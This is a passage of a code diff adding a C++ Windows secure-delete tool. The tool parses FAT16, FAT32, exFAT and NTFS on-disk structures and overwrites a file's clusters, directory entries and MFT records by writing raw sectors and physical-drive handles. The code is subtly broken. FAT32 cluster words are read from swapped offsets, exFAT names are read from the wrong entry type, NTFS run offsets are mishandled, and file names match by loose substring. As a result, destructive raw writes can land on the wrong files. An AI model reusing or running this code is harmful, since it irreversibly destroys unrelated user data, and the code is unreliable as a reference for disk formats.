+            ULONGLONG sectorNum = diskGeo->fatStartSector + diskGeo->fatSize * 2 + sector;
+            
+            if (!ReadSector(diskGeo->volumeLetter, sectorNum, 1, dirData)) {
+                continue;
+            }
+            
+            for (DWORD entry = 0; entry < 16; entry++) {
+                BYTE* dirEntry = &dirData[entry * 32];
+                
+                if (dirEntry[0] == 0x00) {
+                    break;
+                }
+                
+                if (dirEntry[0] == 0xE5) {
+                    continue;
+                }
+                
+                if (dirEntry[11] == 0x0F) {
+                    continue;
+                }
+                
+                wchar_t foundName[13] = {};
+                for (int i = 0; i < 8; i++) {
+                    if (dirEntry[i] != ' ') {
+                        foundName[i] = dirEntry[i];
+                    }
+                }
+                if (dirEntry[8] != ' ' && dirEntry[9] != ' ') {
+                    foundName[8] = '.';
+                    foundName[9] = dirEntry[8];
+                    foundName[10] = dirEntry[9];
+                }
+                
+                std::wstring foundNameStr(foundName);
+                std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                
+                if (foundNameStr.find(searchName) != std::wstring::npos || 
+                    searchName.find(foundNameStr) != std::wstring::npos) {
+                    WORD startCluster = *(WORD*)&dirEntry[26];
+                    DWORD fileSize = *(DWORD*)&dirEntry[28];
+                    
+                    fileLoc->startingCluster = startCluster;
+                    fileLoc->fileSize = fileSize;
+                    
+                    ULONGLONG currentCluster = startCluster;
+                    while (currentCluster < 0xFFF0) {
+                        fileLoc->clusters.push_back(currentCluster);
+                        
+                        ULONGLONG nextCluster = ReadFatEntry(diskGeo, currentCluster);
+                        if (nextCluster >= 0xFFF0 || nextCluster == 0xFFFFFFFF) {
+                            break;
+                        }
+                        currentCluster = nextCluster;
+                    }
+                    
+                    return fileLoc->clusters.size() > 0;
+                }
+            }
+        }
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::FAT32) {
+        ULONGLONG currentCluster = diskGeo->rootDirStartCluster;
+        
+        while (currentCluster < 0x0FFFFFF0) {
+            ULONGLONG sector = ClusterToSector(diskGeo, currentCluster);
+            
+            for (DWORD sec = 0; sec < diskGeo->sectorsPerCluster; sec++) {
+                BYTE dirData[512];
+                if (!ReadSector(diskGeo->volumeLetter, sector + sec, 1, dirData)) {
+                    break;
+                }
+                
+                for (DWORD entry = 0; entry < 16; entry++) {
+                    BYTE* dirEntry = &dirData[entry * 32];
+                    
+                    if (dirEntry[0] == 0x00) {
+                        break;
+                    }
+                    
+                    if (dirEntry[0] == 0xE5) {
+                        continue;
+                    }
+                    
+                    if (dirEntry[11] == 0x0F) {
+                        continue;
+                    }
+                    
+                    wchar_t foundName[13] = {};
+                    for (int i = 0; i < 8; i++) {
+                        if (dirEntry[i] != ' ') {
+                            foundName[i] = dirEntry[i];
+                        }
+                    }
+                    if (dirEntry[8] != ' ' && dirEntry[9] != ' ') {
+                        foundName[8] = '.';
+                        foundName[9] = dirEntry[8];
+                        foundName[10] = dirEntry[9];
+                    }
+                    
+                    std::wstring foundNameStr(foundName);
+                    std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                    
+                    if (foundNameStr.find(searchName) != std::wstring::npos || 
+                        searchName.find(foundNameStr) != std::wstring::npos) {
+                        WORD startClusterLow = *(WORD*)&dirEntry[20];
+                        WORD startClusterHigh = *(WORD*)&dirEntry[26];
+                        DWORD startCluster = (startClusterHigh << 16) | startClusterLow;
+                        DWORD fileSize = *(DWORD*)&dirEntry[28];
+                        
+                        fileLoc->startingCluster = startCluster;
+                        fileLoc->fileSize = fileSize;
+                        
+                        ULONGLONG cluster = startCluster;
+                        while (cluster < 0x0FFFFFF0) {
+                            fileLoc->clusters.push_back(cluster);
+                            
+                            ULONGLONG nextCluster = ReadFatEntry(diskGeo, cluster);
+                            if (nextCluster >= 0x0FFFFFF0 || nextCluster == 0xFFFFFFFF) {
+                                break;
+                            }
+                            cluster = nextCluster;
+                        }
+                        
+                        return fileLoc->clusters.size() > 0;
+                    }
+                }
+            }
+            
+            ULONGLONG nextCluster = ReadFatEntry(diskGeo, currentCluster);
+            if (nextCluster >= 0x0FFFFFF0 || nextCluster == 0xFFFFFFFF) {
+                break;
+            }
+            currentCluster = nextCluster;
+        }
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::exFAT) {
+        ULONGLONG currentCluster = diskGeo->rootDirStartCluster;
+        
+        while (currentCluster < 0x100000000ULL) {
+            ULONGLONG sector = ClusterToSector(diskGeo, currentCluster);
+            
+            for (DWORD sec = 0; sec < diskGeo->sectorsPerCluster; sec++) {
+                BYTE dirData[512];
+                if (!ReadSector(diskGeo->volumeLetter, sector + sec, 1, dirData)) {
+                    break;
+                }
+                
+                for (DWORD entry = 0; entry < 16; entry++) {
+                    BYTE* dirEntry = &dirData[entry * 32];
+                    
+                    if (dirEntry[0] == 0x00) {
+                        break;
+                    }
+                    
+                    if (dirEntry[0] == 0xE5) {
+                        continue;
+                    }
+                    
+                    BYTE entryType = dirEntry[0];
+                    if (entryType != 0x85 && entryType != 0xC5) {
+                        continue;
+                    }
+                    
+                    wchar_t foundName[256] = {};
+                    int nameLength = dirEntry[3];
+                    if (nameLength > 0 && nameLength <= 255) {
+                        for (int i = 0; i < nameLength && i < 255; i++) {
+                            foundName[i] = *(wchar_t*)&dirEntry[4 + i * 2];
+                        }
+                    }
+                    
+                    std::wstring foundNameStr(foundName);
+                    std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                    
+                    if (foundNameStr.find(searchName) != std::wstring::npos || 
+                        searchName.find(foundNameStr) != std::wstring::npos) {
+                        ULONGLONG startCluster = *(ULONGLONG*)&dirEntry[20];
+                        ULONGLONG validDataLength = *(ULONGLONG*)&dirEntry[32];
+                        ULONGLONG fileSize = *(ULONGLONG*)&dirEntry[40];
+                        
+                        fileLoc->startingCluster = startCluster;
+                        fileLoc->fileSize = fileSize;
+                        
+                        if (startCluster == 0 || startCluster >= 0x100000000ULL) {
+                            return false;
+                        }
+                        
+                        ULONGLONG cluster = startCluster;
+                        int maxClusters = 100000;
+                        while (cluster < 0x100000000ULL && maxClusters-- > 0) {
+                            fileLoc->clusters.push_back(cluster);
+                            
+                            ULONGLONG fatOffset = diskGeo->fatStartSector * diskGeo->bytesPerSector + cluster * 8;
+                            ULONGLONG fatSector = fatOffset / 512;
+                            ULONGLONG fatEntryOffset = fatOffset % 512;
+                            
+                            BYTE fatData[512];
+                            if (ReadSector(diskGeo->volumeLetter, diskGeo->fatStartSector + fatSector, 1, fatData)) {
+                                ULONGLONG nextCluster = *(ULONGLONG*)&fatData[fatEntryOffset];
+                                if (nextCluster >= 0x100000000ULL) {
+                                    break;
+                                }
+                                cluster = nextCluster;
+                            }
+                            else {
+                                break;
+                            }
+                        }
+                        
+                        return fileLoc->clusters.size() > 0;
+                    }
+                }
+            }
+            
+            ULONGLONG fatOffset = diskGeo->fatStartSector * diskGeo->bytesPerSector + currentCluster * 8;
+            ULONGLONG fatSector = fatOffset / 512;
+            ULONGLONG fatEntryOffset = fatOffset % 512;
+            
+            BYTE fatData[512];
+            if (!ReadSector(diskGeo->volumeLetter, diskGeo->fatStartSector + fatSector, 1, fatData)) {
+                break;
+            }
+            
+            ULONGLONG nextCluster = *(ULONGLONG*)&fatData[fatEntryOffset];
+            if (nextCluster >= 0x100000000ULL) {
+                break;
+            }
+            currentCluster = nextCluster;
+        }
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::NTFS) {
+        BYTE bootSector[512];
+        if (!ReadSector(diskGeo->volumeLetter, 0, 1, bootSector)) {
+            return false;
+        }
+        
+        DWORD bytesPerCluster = static_cast<DWORD>(diskGeo->sectorsPerCluster * diskGeo->bytesPerSector);
+        ULONGLONG mftStartLcn = *(LONGLONG*)&bootSector[0x30];
+        
+        CHAR mftRecordSizeIndicator = *(CHAR*)&bootSector[0x40];
+        DWORD mftRecordSize;
+        if (mftRecordSizeIndicator > 0) {
+            mftRecordSize = mftRecordSizeIndicator * bytesPerCluster;
+        } else if (mftRecordSizeIndicator < 0) {
+            mftRecordSize = 1 << (-mftRecordSizeIndicator);
+        } else {
+            mftRecordSize = 1024;
+        }
+        
+        wprintf(L"[DEBUG] MFT record size indicator=%d, calculated size=%u\n", 
+                (int)mftRecordSizeIndicator, mftRecordSize);
+        
+        ULONGLONG mftStartSector = mftStartLcn * diskGeo->sectorsPerCluster;
+        
+        DWORD maxMftRecords = static_cast<DWORD>(bytesPerCluster * 16 / mftRecordSize);
+        if (maxMftRecords < 1) maxMftRecords = 1;
+        if (maxMftRecords > 16) maxMftRecords = 16;
+        
+        ULONGLONG maxSearchSectors = 128 * 1024 * 1024 / 512;
+        ULONGLONG searchedSectors = 0;
+        
+        while (searchedSectors < maxSearchSectors) {
+            BYTE mftData[1024];
+            if (!ReadSector(diskGeo->volumeLetter, mftStartSector + searchedSectors, 2, mftData)) {
+                searchedSectors += 2;
+                continue;
+            }
+            
+            searchedSectors += 2;
+            
+            BYTE* record = mftData;
+            
+            WORD signature = *(WORD*)record;
+            if (signature != 0x4649 && signature != 0x4946 && signature != 0x454E) {
+                continue;
+            }
+            
+            DWORD sequenceNumber = *(DWORD*)(record + 0x0C);
+            if (sequenceNumber == 0) {
+                continue;
+            }
+            
+            WORD recordFlags = *(WORD*)(record + 0x16);
+            if ((recordFlags & 0x01) == 0) {
+                continue;
+            }
+                    
+                    DWORD attrOffset = *(WORD*)(record + 0x14);
+                    
+                    while (attrOffset > 0 && attrOffset < mftRecordSize) {
+                        BYTE* attr = record + attrOffset;
+                        
+                        DWORD attrType = *(DWORD*)attr;
+                        if (attrType == 0xFFFFFFFF || attrType == 0) {
+                            break;
+                        }
+                        
+                        WORD attrLength = *(WORD*)(attr + 4);
+                        if (attrLength == 0 || attrLength > mftRecordSize) {
+                            break;
+                        }
+                        
+                        if (attrType == 0x30) {
+                            wchar_t foundName[256] = {};
+                            WORD contentOffset = *(WORD*)(attr + 0x14);
+                            BYTE nameLength = attr[contentOffset + 0x0A];
+                            
+                            if (nameLength > 0 && nameLength < 256) {
+                                for (BYTE i = 0; i < nameLength; i++) {
+                                    foundName[i] = *(wchar_t*)(attr + contentOffset + 0x44 + i * 2);
+                                }
+                            }
+                            
+                            std::wstring foundNameStr(foundName);
+                            std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                            
+                            if (foundNameStr.find(searchName) != std::wstring::npos || 
+                                searchName.find(foundNameStr) != std::wstring::npos) {
+                                
+                                wprintf(L"[DEBUG] MATCH FOUND! File='%s'\n", foundNameStr.c_str());
+                                
+                                DWORD dataAttrOffset = *(WORD*)(record + 0x14);
+                                while (dataAttrOffset > 0 && dataAttrOffset < mftRecordSize) {
+                                    BYTE* dataAttr = record + dataAttrOffset;
+                                    DWORD dataAttrType = *(DWORD*)dataAttr;
+                                    WORD dataAttrLength = *(WORD*)(dataAttr + 4);
+                                    
+                                    if (dataAttrLength == 0 || dataAttrLength > mftRecordSize) {
+                                        break;
+                                    }
+                                    
+                                    if (dataAttrType == 0x80) {
+                                        BYTE* dataRun = dataAttr + dataAttr[0x0A];
+                                        ULONGLONG offset = 0;
+                                        ULONGLONG length = 0;
+                                        
+                                        while (*dataRun != 0) {
+                                            BYTE header = *dataRun;
+                                            BYTE lengthSize = header & 0x0F;
+                                            BYTE offsetSize = (header >> 4) & 0x0F;
+                                            
+                                            ULONGLONG runLength = 0;
+                                            for (BYTE i = 0; i < lengthSize && i < 8; i++) {
+                                                runLength |= ((ULONGLONG)dataRun[1 + i]) << (i * 8);
+                                            }
+                                            
+                                            ULONGLONG runOffset = 0;
+                                            for (BYTE i = 0; i < offsetSize && i < 8; i++) {
+                                                runOffset |= ((ULONGLONG)dataRun[1 + lengthSize + i]) << (i * 8);
+                                            }
+                                            
+                                            if (offsetSize > 0) {
+                                                offset += runOffset;
+                                            }
+                                            else {
+                                                offset = length;
+                                            }
+                                            length += runLength;
+                                            
+                                            dataRun += 1 + lengthSize + offsetSize;
+                                        }
+                                        
+                                        if (length > 0) {
+                                            fileLoc->startingCluster = offset;
+                                            fileLoc->fileSize = length * bytesPerCluster;
+                                            
+                                            for (ULONGLONG i = 0; i < length; i++) {
+                                                fileLoc->clusters.push_back(offset + i);
+                                            }
+                                            
+                                            return fileLoc->clusters.size() > 0;
+                                        }
+                                    }
+                                    
+                                    dataAttrOffset += dataAttrLength;
+                                }
+                            }
+                        }
+                        
+                        attrOffset += attrLength;
+                    }
+        }
+    }
+    
+    return false;
+}
+
+static bool WipeClusters(DiskGeometry* diskGeo, FileLocation* fileLoc, SecureWipeMode mode) {
+    if (!diskGeo || !fileLoc) return false;
+    
+    wprintf(L"[DEBUG] WipeClusters: fsType=%d, clusters=%llu, mode=%d\n", 
+            (int)diskGeo->fsType, (unsigned long long)fileLoc->clusters.size(), (int)mode);
+    
+    DWORD passes = 1;
+    switch (mode) {
+        case SecureWipeMode::DoD_5220_22_M:
+            passes = 3;
+            break;
+        case SecureWipeMode::GutmannFull:
+            passes = 7;
+            break;
+        case SecureWipeMode::SingleRandom:
+            passes = 1;
+            break;
+        default:
+            passes = 3;
+    }
+    
+    std::vector<BYTE> wipeBuffer(diskGeo->sectorsPerCluster * diskGeo->bytesPerSector);
+    std::vector<BYTE> randomBuffer(diskGeo->sectorsPerCluster * diskGeo->bytesPerSector);
+    
+    InitializeRandomIfNeeded();
+    
+    for (DWORD pass = 0; pass < passes; pass++) {
+        BYTE fillValue = 0x00;
+        
+        if (mode == SecureWipeMode::SingleRandom) {
+            for (size_t i = 0; i < randomBuffer.size(); i++) {
+                randomBuffer[i] = static_cast<BYTE>(g_rng() & 0xFF);
+            }
+        }
+        else if (mode == SecureWipeMode::DoD_5220_22_M) {
+            if (pass == 0) fillValue = 0x00;
+            else if (pass == 1) fillValue = 0xFF;
+            else {
+                for (size_t i = 0; i < randomBuffer.size(); i++) {
+                    randomBuffer[i] = static_cast<BYTE>(g_rng() & 0xFF);
+                }
+            }
+        }
+        else if (mode == SecureWipeMode::GutmannFull) {
+            if (pass < 4) {
+                fillValue = (pass % 2 == 0) ? 0x55 : 0xAA;
+            }
+            else {
+                for (size_t i = 0; i < randomBuffer.size(); i++) {
+                    randomBuffer[i] = static_cast<BYTE>(g_rng() & 0xFF);
+                }
+            }
+        }
+        
+        if (fillValue != 0x00) {
+            memset(wipeBuffer.data(), fillValue, wipeBuffer.size());
+        }
+        
+        for (ULONGLONG cluster : fileLoc->clusters) {
+            ULONGLONG sector = ClusterToSector(diskGeo, cluster);
+            
+            LPBYTE writeBuffer = wipeBuffer.data();
+            if (mode == SecureWipeMode::SingleRandom ||
+                (mode == SecureWipeMode::DoD_5220_22_M && pass == 2) ||
+                ((mode == SecureWipeMode::GutmannFull) && pass >= 4)) {
+                writeBuffer = randomBuffer.data();
+            }
+            
+            bool writeResult = WriteSector(diskGeo->volumeLetter, sector, static_cast<DWORD>(diskGeo->sectorsPerCluster), writeBuffer);
+            if (writeResult) {
+                wprintf(L"[DEBUG] Wrote sector %llu successfully\n", (unsigned long long)sector);
+            }
+        }
+    }
+    
+    return true;
+}
+
+static bool WipeDirectoryClusters(DiskGeometry* diskGeo, BYTE* mftRecord, DWORD mftRecordSize, DWORD bytesPerCluster, SecureWipeMode mode) {
+    if (!diskGeo || !mftRecord) return false;
+    
+    DWORD attrOffset = *(WORD*)(mftRecord + 0x14);
+    
+    while (attrOffset > 0 && attrOffset < mftRecordSize) {
+        BYTE* attr = mftRecord + attrOffset;
+        
+        DWORD attrType = *(DWORD*)attr;
+        if (attrType == 0xFFFFFFFF || attrType == 0) {
+            break;
+        }
+        
+        WORD attrLength = *(WORD*)(attr + 4);
+        if (attrLength == 0 || attrLength > mftRecordSize) {
+            break;
+        }
+        
+        if (attrType == 0x80 || attrType == 0xA0) {
+            BYTE* dataRun = attr + attr[0x0A];
+            ULONGLONG offset = 0;
+            ULONGLONG length = 0;
+            
+            while (*dataRun != 0) {
+                BYTE header = *dataRun;
+                BYTE lengthSize = header & 0x0F;
+                BYTE offsetSize = (header >> 4) & 0x0F;
+                
+                ULONGLONG runLength = 0;
+                for (BYTE i = 0; i < lengthSize && i < 8; i++) {
+                    runLength |= ((ULONGLONG)dataRun[1 + i]) << (i * 8);
+                }
+                
+                ULONGLONG runOffset = 0;
+                for (BYTE i = 0; i < offsetSize && i < 8; i++) {
+                    runOffset |= ((ULONGLONG)dataRun[1 + lengthSize + i]) << (i * 8);
+                }
+                
+                if (offsetSize > 0) {
+                    offset += runOffset;
+                }
+                else {
+                    offset = length;
+                }
+                length += runLength;
+                
+                dataRun += 1 + lengthSize + offsetSize;
+            }
+            
+            if (length > 0) {
+                FileLocation fileLoc;
+                fileLoc.volumeLetter = diskGeo->volumeLetter;
+                fileLoc.startingCluster = offset;
+                fileLoc.fileSize = length * bytesPerCluster;
+                
+                for (ULONGLONG i = 0; i < length && i < 100000; i++) {
+                    fileLoc.clusters.push_back(offset + i);
+                }
+                
+                WipeClusters(diskGeo, &fileLoc, mode);
+            }
+        }
+        
+        attrOffset += attrLength;
+    }
+    
+    return true;
+}
+
+static bool WipeDirectoryEntry(DiskGeometry* diskGeo, const std::wstring& dirName) {
+    if (!diskGeo) return false;
+    
+    std::wstring searchName = dirName;
+    std::transform(searchName.begin(), searchName.end(), searchName.begin(), ::toupper);
+    
+    if (diskGeo->fsType == DiskFileSystemType::NTFS) {
+        return true;
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::FAT32 || diskGeo->fsType == DiskFileSystemType::FAT16) {
+        ULONGLONG rootStartSector = diskGeo->dataStartSector;
+        
+        if (diskGeo->fsType == DiskFileSystemType::FAT32) {
+            rootStartSector = ClusterToSector(diskGeo, diskGeo->rootDirStartCluster);
+        }
+        
+        for (DWORD sec = 0; sec < 32; sec++) {
+            BYTE dirData[512];
+            if (!ReadSector(diskGeo->volumeLetter, rootStartSector + sec, 1, dirData)) {
+                continue;
+            }
+            
+            for (DWORD entry = 0; entry < 16; entry++) {
+                BYTE* dirEntry = &dirData[entry * 32];
+                
+                if (dirEntry[0] == 0x00) {
+                    return true;
+                }
+                
+                if (dirEntry[0] == 0xE5) {
+                    continue;
+                }
+                
+                wchar_t foundName[13] = {};
+                for (int i = 0; i < 8; i++) {
+                    if (dirEntry[i] != ' ') {
+                        foundName[i] = dirEntry[i];
+                    }
+                }
+                if (dirEntry[8] != ' ' && dirEntry[9] != ' ') {
+                    foundName[8] = '.';
+                    foundName[9] = dirEntry[8];
+                    foundName[10] = dirEntry[9];
+                }
+                
+                std::wstring foundNameStr(foundName);
+                std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                
+                if (foundNameStr.find(searchName) != std::wstring::npos || 
+                    searchName.find(foundNameStr) != std::wstring::npos) {
+                    memset(dirEntry, 0xE5, 32);
+                    WriteSector(diskGeo->volumeLetter, rootStartSector + sec, 1, dirData);
+                    return true;
+                }
+            }
+        }
+    }
+    else if (diskGeo->fsType == DiskFileSystemType::exFAT) {
+        ULONGLONG currentCluster = diskGeo->rootDirStartCluster;
+        
+        while (currentCluster < 0x100000000ULL) {
+            ULONGLONG sector = ClusterToSector(diskGeo, currentCluster);
+            
+            for (DWORD sec = 0; sec < diskGeo->sectorsPerCluster; sec++) {
+                BYTE dirData[512];
+                if (!ReadSector(diskGeo->volumeLetter, sector + sec, 1, dirData)) {
+                    break;
+                }
+                
+                for (DWORD entry = 0; entry < 16; entry++) {
+                    BYTE* dirEntry = &dirData[entry * 32];
+                    
+                    if (dirEntry[0] == 0x00) {
+                        return true;
+                    }
+                    
+                    if (dirEntry[0] == 0xE5) {
+                        continue;
+                    }
+                    
+                    if (dirEntry[0] != 0x85 && dirEntry[0] != 0xC5) {
+                        continue;
+                    }
+                    
+                    wchar_t foundName[256] = {};
+                    int nameLength = dirEntry[3];
+                    if (nameLength > 0 && nameLength <= 255) {
+                        for (int i = 0; i < nameLength && i < 255; i++) {
+                            foundName[i] = *(wchar_t*)&dirEntry[4 + i * 2];
+                        }
+                    }
+                    
+                    std::wstring foundNameStr(foundName);
+                    std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                    
+                    if (foundNameStr.find(searchName) != std::wstring::npos || 
+                        searchName.find(foundNameStr) != std::wstring::npos) {
+                        dirEntry[0] = 0xE5;
+                        WriteSector(diskGeo->volumeLetter, sector + sec, 1, dirData);
+                        return true;
+                    }
+                }
+            }
+            
+            ULONGLONG fatOffset = diskGeo->fatStartSector * diskGeo->bytesPerSector + currentCluster * 8;
+            ULONGLONG fatSector = fatOffset / 512;
+            ULONGLONG fatEntryOffset = fatOffset % 512;
+            
+            BYTE fatData[512];
+            if (!ReadSector(diskGeo->volumeLetter, diskGeo->fatStartSector + fatSector, 1, fatData)) {
+                break;
+            }
+            
+            ULONGLONG nextCluster = *(ULONGLONG*)&fatData[fatEntryOffset];
+            if (nextCluster >= 0x100000000ULL) {
+                break;
+            }
+            currentCluster = nextCluster;
+        }
+    }
+    
+    return true;
+}
+
+struct NtfsVolumeInfo {
+    ULONGLONG mftStartLcn;
+    ULONGLONG mftMirrorStartLcn;
+    DWORD bytesPerFileRecordSegment;
+    DWORD bytesPerIndexBlock;
+    ULONGLONG volumeSerialNumber;
+    BYTE volumeLabel[66];
+    bool hasVolumeLabel;
+};
+
+static bool ReadNtfsBootSector(WCHAR driveLetter, BYTE* bootSector, NtfsVolumeInfo* ntfsInfo) {
+    if (!ReadSector(driveLetter, 0, 1, bootSector)) {
+        return false;
+    }
+    
+    if (bootSector[3] != 'N' || bootSector[4] != 'T' || bootSector[5] != 'F' || bootSector[6] != 'S') {
+        return false;
+    }
+    
+    if (ntfsInfo) {
+        memset(ntfsInfo, 0, sizeof(NtfsVolumeInfo));
+        
+        ntfsInfo->bytesPerFileRecordSegment = *(DWORD*)&bootSector[0xA4];
+        ntfsInfo->bytesPerIndexBlock = *(DWORD*)&bootSector[0xA8];
+        ntfsInfo->mftStartLcn = *(LONGLONG*)&bootSector[0x30];
+        ntfsInfo->mftMirrorStartLcn = *(LONGLONG*)&bootSector[0x38];
+        ntfsInfo->volumeSerialNumber = *(ULONGLONG*)&bootSector[0x48];
+        
+        WORD jumpBootSector = *(WORD*)&bootSector[0];
+        if (jumpBootSector != 0x0000 && jumpBootSector != 0xEB00) {
+            ntfsInfo->hasVolumeLabel = false;
+        }
+        else {
+            ntfsInfo->hasVolumeLabel = (bootSector[0x50] != 0);
+        }
+    }
+    
+    return true;
+}
+
+static bool ReadNtfsMftRecord(WCHAR driveLetter, ULONGLONG mftRecordIndex, BYTE* buffer, DWORD recordSize) {
+    BYTE bootSector[512];
+    NtfsVolumeInfo ntfsInfo;
+    
+    if (!ReadNtfsBootSector(driveLetter, bootSector, &ntfsInfo)) {
+        return false;
+    }
+    
+    DWORD bytesPerCluster = *(DWORD*)&bootSector[0xB0];
+    if (bytesPerCluster == 0) {
+        bytesPerCluster = 512;
+    }
+    
+    ULONGLONG mftRecordSize = ntfsInfo.bytesPerFileRecordSegment;
+    if (mftRecordSize == 0) {
+        mftRecordSize = 1024;
+    }
+    
+    ULONGLONG mftStartCluster = ntfsInfo.mftStartLcn;
+    
+    ULONGLONG recordOffsetInClusters = mftRecordIndex * mftRecordSize / bytesPerCluster;
+    ULONGLONG recordOffsetInSectors = recordOffsetInClusters * (bytesPerCluster / 512);
+    
+    return ReadSector(driveLetter, mftStartCluster * (bytesPerCluster / 512) + recordOffsetInSectors,
+                      static_cast<DWORD>((mftRecordSize + 511) / 512), buffer);
+}
+
+static bool WipeNtfsMftEntry(WCHAR driveLetter, ULONGLONG fileReferenceNumber) {
+    BYTE bootSector[512];
+    NtfsVolumeInfo ntfsInfo;
+    
+    if (!ReadNtfsBootSector(driveLetter, bootSector, &ntfsInfo)) {
+        return false;
+    }
+    
+    DWORD mftRecordSize = ntfsInfo.bytesPerFileRecordSegment;
+    if (mftRecordSize == 0) {
+        mftRecordSize = 1024;
+    }
+    
+    std::vector<BYTE> mftRecordBuffer(mftRecordSize * 2);
+    
+    ULONGLONG mftRecordIndex = fileReferenceNumber & 0x0000FFFFFFFFFFFFULL;
+    
+    if (!ReadNtfsMftRecord(driveLetter, mftRecordIndex, mftRecordBuffer.data(), mftRecordSize)) {
+        return false;
+    }
+    
+    if (mftRecordBuffer[0] == 0x00 || mftRecordBuffer[0] == 0xFF) {
+        return true;
+    }
+    
+    WORD signature = *(WORD*)&mftRecordBuffer[0];
+    if (signature != 0x4649 && signature != 0x4946 && signature != 0x454E) {
+        return false;
+    }
+    
+    memset(mftRecordBuffer.data(), 0x00, mftRecordSize);
+    for (DWORD i = 0; i < 3; i++) {
+        if (i == 1) {
+            memset(mftRecordBuffer.data(), 0xFF, mftRecordSize);
+        }
+        else if (i == 2) {
+            InitializeRandomIfNeeded();
+            for (DWORD j = 0; j < mftRecordSize; j++) {
+                mftRecordBuffer[j] = static_cast<BYTE>(g_rng() & 0xFF);
+            }
+        }
+        
+        DWORD bytesPerCluster = *(DWORD*)&bootSector[0xB0];
+        if (bytesPerCluster == 0) {
+            bytesPerCluster = 512;
+        }
+        
+        ULONGLONG mftStartCluster = ntfsInfo.mftStartLcn;
+        ULONGLONG recordOffsetInClusters = mftRecordIndex * mftRecordSize / bytesPerCluster;
+        ULONGLONG recordOffsetInSectors = recordOffsetInClusters * (bytesPerCluster / 512);
+        
+        WriteSector(driveLetter, mftStartCluster * (bytesPerCluster / 512) + recordOffsetInSectors,
+                    (mftRecordSize + 511) / 512, mftRecordBuffer.data());
+    }
+    
+    return true;
+}
+
+static bool GetPhysicalDriveNumber(WCHAR volumeLetter, DWORD* physicalDriveNumber) {
+    wchar_t volumePath[50];
+    swprintf_s(volumePath, L"\\\\.\\%c:", volumeLetter);
+    
+    HandlePtr hVolume(CreateFileW(
+        volumePath,
+        0,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    ));
+    
+    if (hVolume.get() == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    STORAGE_DEVICE_NUMBER deviceNumber;
+    DWORD bytesReturned = 0;
+    
+    if (!DeviceIoControl(
+        hVolume.get(),
+        IOCTL_STORAGE_GET_DEVICE_NUMBER,
+        NULL,
+        0,
+        &deviceNumber,
+        sizeof(deviceNumber),
+        &bytesReturned,
+        NULL
+    )) {
+        return false;
+    }
+    
+    *physicalDriveNumber = deviceNumber.DeviceNumber;
+    return true;
+}
+
+static bool WipePhysicalDriveSectors(DWORD driveNumber, ULONGLONG startSector, DWORD sectorCount, BYTE fillValue) {
+    wchar_t devicePath[50];
+    swprintf_s(devicePath, L"\\\\.\\PhysicalDrive%d", driveNumber);
+    
+    HandlePtr hDrive(CreateFileW(
+        devicePath,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
+        NULL
+    ));
+    
+    if (hDrive.get() == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    
+    DISK_GEOMETRY geom;
+    DWORD bytesReturned = 0;
+    
+    if (!DeviceIoControl(
+        hDrive.get(),
+        IOCTL_DISK_GET_DRIVE_GEOMETRY,
+        NULL,
+        0,
+        &geom,
+        sizeof(geom),
+        &bytesReturned,
+        NULL
+    )) {
+        return false;
+    }
+    
+    DWORD bytesPerSector = geom.BytesPerSector;
+    if (bytesPerSector == 0) {
+        bytesPerSector = 512;
+    }
+    
+    std::vector<BYTE> buffer(sectorCount * bytesPerSector, fillValue);
+    
+    LARGE_INTEGER offset;
+    offset.QuadPart = startSector * bytesPerSector;
+    
+    if (!SetFilePointerEx(hDrive.get(), offset, NULL, FILE_BEGIN)) {
+        return false;
+    }
+    
+    DWORD bytesWritten = 0;
+    if (!WriteFile(hDrive.get(), buffer.data(), static_cast<DWORD>(buffer.size()), &bytesWritten, NULL)) {
+        return false;
+    }
+    
+    FlushFileBuffers(hDrive.get());
+    
+    return bytesWritten == buffer.size();
+}
+
+static bool WipeMftRecord(WCHAR driveLetter, ULONGLONG fileRef) {
+    return WipeNtfsMftEntry(driveLetter, fileRef);
+}
+
+static bool LowLevelShredFileWithInfo(WCHAR driveLetter, const std::wstring& fileName, DiskGeometry* diskGeo, SecureWipeMode mode, bool isDirectory) {
+    if (diskGeo->fsType == DiskFileSystemType::Unknown) {
+        wprintf(L"[DEBUG] fsType is Unknown, returning false\n");
+        return false;
+    }
+    
+    wprintf(L"[DEBUG] LowLevelShredFileWithInfo: fsType=%d, fileName=%s\n", (int)diskGeo->fsType, fileName.c_str());
+    
+    if (diskGeo->fsType == DiskFileSystemType::NTFS) {
+        BYTE bootSector[512];
+        if (!ReadSector(driveLetter, 0, 1, bootSector)) {
+            wprintf(L"[DEBUG] ReadSector failed for boot sector\n");
+            return false;
+        }
+        
+        DWORD bytesPerCluster = static_cast<DWORD>(diskGeo->sectorsPerCluster * diskGeo->bytesPerSector);
+        ULONGLONG mftStartLcn = *(LONGLONG*)&bootSector[0x30];
+        
+        CHAR mftRecordSizeIndicator = *(CHAR*)&bootSector[0x40];
+        DWORD mftRecordSize;
+        if (mftRecordSizeIndicator > 0) {
+            mftRecordSize = mftRecordSizeIndicator * bytesPerCluster;
+        } else if (mftRecordSizeIndicator < 0) {
+            mftRecordSize = 1 << (-mftRecordSizeIndicator);
+        } else {
+            mftRecordSize = 1024;
+        }
+        
+        ULONGLONG mftStartSector = mftStartLcn * diskGeo->sectorsPerCluster;
+        
